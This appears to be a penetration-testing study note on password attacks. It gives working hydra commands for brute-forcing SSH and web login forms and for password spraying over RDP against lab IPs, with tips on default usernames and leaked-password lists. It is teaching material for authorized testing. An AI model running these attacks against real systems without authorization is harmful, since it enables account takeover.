
#### Tips

If we cant find any user information, but we can see there are common services open - we can attempt to attack `root` or `Administrator` users depending on operating systems.

`admin` is the default username for a lot of web login forms, we should focus on this username if we have no other information regarding usernames. We should `still search documentation for online services to find default credentials/users`

Services (such as ScatteredSecrets and  WeLeakInfo) track password leaks and compromises and sell the plaintext passwords, we can use these as a dictionary or as ammunition for a password spray attack.

If we find passwords during an engagement we should spray them against all target systems. This is especially effective with users that reuse passwords.

Bruteforcing may lead to lockout of user accounts, password spraying may be more effective - we should enumerate properly first before we think about bruteforcing a system to asses, identify and avoid the risk of automated security responses like user lockout and other actions.
#### Services Example

`hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.238.201` example usage bruteforcing ssh service with username George and rockyou wordlist

`hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202` - example of a password spraying attack on an rdp service

#### HTTP POST Example

Bruteforcing a web form with hydra requires us to find the post body data, and a failed login response (to identify changes which signify a failed response) - for more complex application we may need to dig deeper into source code to find a signifier of failed login attempt.

`hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` example of using hydra to bruteforce a webform

colon separated http-post-form argument:
`/index.php` - location of the login form
`fm_usr=user&fm_pwd=^PASS^` - the request body
`Login failed. Invalid` - failed attempt identifier (searched for within the response of the web application) we can shorted this string if needed if it contains keywords creating false positives (like "incorrect password"... password may be in the response regardless)

`WAF will stop this activity quickly as well as accountl lockouts from fail2ban but a lot of web apps cannot afford this capability so it is a good vector to attack`

#### HTTP GET example

`hydra -l user -P /usr/share/wordlists/rockyou.txt "http-get://192.168.238.201/html:A=BASIC:F=Unauthorized"` - basic authentication get method bruteforce

`F=` fail message to look for
`A=` Authentication type

`hydra http-get -U` to find information for usage
